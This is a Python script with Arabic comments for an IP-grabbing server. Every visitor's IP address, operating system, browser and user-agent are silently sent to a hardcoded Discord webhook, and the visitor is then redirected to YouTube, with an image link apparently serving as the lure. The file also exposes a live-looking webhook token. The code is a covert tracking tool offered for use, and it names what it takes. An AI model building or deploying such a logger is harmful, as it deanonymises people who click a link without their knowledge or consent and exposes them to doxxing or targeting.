from http.server import BaseHTTPRequestHandler, HTTPServer
import requests
import httpagentparser
from urllib import parse
import json

# إعدادات السيرفر
HOST = "0.0.0.0"  # تشغيل السيرفر على جميع الواجهات
PORT = 8080  # المنفذ الذي يعمل عليه السيرفر

# رابط Webhook الخاص بـ Discord (استبدله برابطك)
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1334788763901231135/TYM4Pqjma73Z7urVGufGYqm_4j6jbwLrtvdqBIZcbt4tgFoS_K-SPCdEwjRDUUW2IaS2"

# رابط الصورة الافتراضية (يمكنك استبداله)
DEFAULT_IMAGE_URL = "https://previews.123rf.com/images/nobilior/nobilior1412/nobilior141200028/34908808-nice-female-ass-white-background-isolated.jpg"

# رابط الموقع الذي سيتم تحويل المستخدم إليه
REDIRECT_URL = "https://www.youtube.com/"  # استبدله بأي رابط تريد

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # استخراج عنوان IP الخاص بالزائر
            ip = self.client_address[0]
            
            # استخراج بيانات المتصفح ونظام التشغيل
            user_agent = self.headers.get("User-Agent", "Unknown")
            os, browser = httpagentparser.simple_detect(user_agent)

            # إرسال البيانات إلى Discord Webhook
            discord_payload = {
                "username": "Visitor Logger",
                "embeds": [
                    {
                        "title": "🚀 زيارة جديدة",
                        "color": 3447003,
                        "fields": [
                            {"name": "📌 IP", "value": ip, "inline": False},
                            {"name": "🖥 OS", "value": os, "inline": True},
                            {"name": "🌐 Browser", "value": browser, "inline": True},
                            {"name": "🔗 User-Agent", "value": user_agent, "inline": False},
                            {"name": "🖼 Image Opened", "value": DEFAULT_IMAGE_URL, "inline": False}
                        ]
                    }
                ]
            }
            requests.post(DISCORD_WEBHOOK_URL, json=discord_payload)

            # إعادة توجيه المستخدم إلى الموقع المحدد
            self.send_response(302)  # 302 = Found (Redirect)
            self.send_header("Location", REDIRECT_URL)  # إعادة توجيه إلى الموقع
            self.end_headers()

        except Exception as e:
            print("Error:", e)
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"500 - Internal Server Error")

# تشغيل السيرفر
if __name__ == "__main__":
    server = HTTPServer((HOST, PORT), RedirectHandler)
    print(f"✅ Server running on http://{HOST}:{PORT}")
    server.serve_forever() 
